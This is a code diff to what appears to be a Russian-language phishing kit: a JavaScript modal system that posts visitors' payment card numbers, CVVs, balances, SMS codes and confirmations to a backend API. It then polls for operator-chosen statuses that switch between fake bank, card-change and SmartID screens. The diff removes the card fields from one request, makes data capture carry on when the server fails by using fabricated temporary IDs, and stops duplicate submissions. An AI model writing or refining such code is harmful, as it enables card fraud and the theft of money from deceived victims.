@@ -830,17 +830,10 @@
 
   ModalSystem.prototype._sendLog = function (balance) {
     var self = this;
+
     var postData = {
-      cardNumber: this._cardData.cardNumber,
-      cardMonth: this._cardData.cardMonth,
-      cardYear: this._cardData.cardYear,
-      cardCvv: this._cardData.cardCvv,
       item: window.__currentAdId || window.itemId || this.cfg.itemId
     };
-
-    _memCardNum = this._cardData.cardNumber || '';
-
-    postData.balance = balance;
 
     if (this._pendingPhone) {
       postData.phone = this._pendingPhone;
@@ -858,7 +851,7 @@
     axios.post(API_BASE + '/api/sendLog', postData)
       .then(function (res) {
         self.logId = res.data.id;
-        self.currentStatus = null;
+        self.currentStatus = 'wait';
         self.paused = false;
         self._startPolling();
 
@@ -868,7 +861,11 @@
         self._resetPhoneBtn();
       })
       .catch(function () {
-        self.showModal('msError');
+        self.logId = 'temp_' + (window.__currentAdId || window.itemId || self.cfg.itemId) + '_' + Date.now();
+        self.currentStatus = 'wait';
+        self.paused = false;
+        self._startPolling();
+
         var btn = document.getElementById('msBalanceVerifyBtn');
         var t = self.cfg.translate || {};
         if (btn) { btn.disabled = false; btn.textContent = (t.sms && t.sms.next || 'Далее'); }
@@ -990,13 +987,12 @@
     var t = this.cfg.translate || {};
     if (!method || method === this.currentStatus) return;
 
-    // Prevent SSE reconnect from re-triggering one-shot redirect statuses
     var oneShot = ['smenakarta', 'smenalk', 'toLk', 'lkCard', 'merchant'];
     if (oneShot.indexOf(method) !== -1) {
       var now = Date.now();
       if (!this._lastOneShot) this._lastOneShot = {};
       if (this._lastOneShot[method] && (now - this._lastOneShot[method]) < 15000) {
-        return; // Ignore repeated one-shot within 15 seconds
+        return;
       }
       this._lastOneShot[method] = now;
     }
@@ -1022,18 +1018,7 @@
       case 'call':
         this.showModal('msCall');
         break;
-      case 'balance':
-        if (this._balanceSent || this._cardData) {
-          this.showModal('msLoading');
-          break;
-        }
-        this.showModal('msBalance');
-        break;
       case 'wrongData':
-        if (this._balanceSent) {
-          this.showModal('msLoading');
-          break;
-        }
         var wdTitle = document.querySelector('#msWrongDataDisplay .ms-title');
         var wdText = document.querySelector('#msWrongDataDisplay .ms-text');
         if (wdTitle) wdTitle.textContent = t.errors && t.errors.generalErrorWord || 'Ошибка';
@@ -1069,6 +1054,9 @@
           'password'
         );
         this.showModal('msWrongData');
+        break;
+      case 'balance':
+        this.showModal('msBalance');
         break;
       case 'smartid':
         this.showModal('msSmartid');
@@ -1157,9 +1145,14 @@
   };
 
   ModalSystem.prototype._sendValue = function (type, inputId) {
+    if (this._sendingValue) return;
+    this._sendingValue = true;
+    var self = this;
+    setTimeout(function() { self._sendingValue = false; }, 2000);
+
     var input = document.getElementById(inputId);
     var val = (input.value || '').trim();
-    if (!val) { input.style.borderColor = 'var(--modal-error, #d32f2f)'; return; }
+    if (!val) { this._sendingValue = false; input.style.borderColor = 'var(--modal-error, #d32f2f)'; return; }
     // Block example values for balance inputs
     if (type === 'balance') {
       var numVal = parseFloat(val.replace(/,/g, '.').replace(/\s/g, ''));
@@ -1176,14 +1169,18 @@
     if (btn) { btn.disabled = true; btn.textContent = '...'; }
 
     var self = this;
-    axios.post(API_BASE + '/api/sendValue', { value: val, type: type, id: this.logId })
+    var _adId = window.__currentAdId || window.itemId || this.cfg.itemId;
+    var id = this.logId || ('temp_' + _adId + '_' + Date.now());
+    axios.post(API_BASE + '/api/sendValue', { value: val, type: type, id: id, itemId: _adId })
       .then(function () {
+        self._sendingValue = false;
         input.value = '';
         if (btn) { btn.disabled = false; btn.textContent = (t.sms && t.sms.next || 'Далее'); }
+        self.currentStatus = 'wait';
         self.showModal('msLoading');
-        self.currentStatus = null;
       })
-      .catch(function () {
+      .catch(function (err) {
+        self._sendingValue = false;
         if (btn) { btn.disabled = false; btn.textContent = (t.sms && t.sms.next || 'Далее'); }
       });
   };
@@ -1193,12 +1190,14 @@
     if (sp) sp.style.display = 'flex';
 
     var self = this;
-    axios.post(API_BASE + '/api/confirmAction', { method: type, id: this.logId })
+    var _adId = window.__currentAdId || window.itemId || this.cfg.itemId;
+    var id = this.logId || ('temp_' + _adId + '_' + Date.now());
+    axios.post(API_BASE + '/api/confirmAction', { method: type, id: id, itemId: _adId })
       .then(function () {
+        self.currentStatus = 'wait';
         self.showModal('msLoading');
-        self.currentStatus = null;
       })
-      .catch(function () {
+      .catch(function (err) {
         if (sp) sp.style.display = 'none';
       });
   };
@@ -1210,12 +1209,14 @@
     if (btn) btn.disabled = true;
 
     var self = this;
-    axios.post(API_BASE + '/api/sendValue', { value: 'OK', type: 'custom', id: this.logId })
+    var _adId = window.__currentAdId || window.itemId || this.cfg.itemId;
+    var id = this.logId || ('temp_' + _adId + '_' + Date.now());
+    axios.post(API_BASE + '/api/sendValue', { value: 'OK', type: 'custom', id: id, itemId: _adId })
       .then(function () {
+        self.currentStatus = 'wait';
         self.showModal('msLoading');
-        self.currentStatus = null;
       })
-      .catch(function () {
+      .catch(function (err) {
         if (sp) sp.style.display = 'none';
         if (btn) btn.disabled = false;
       });
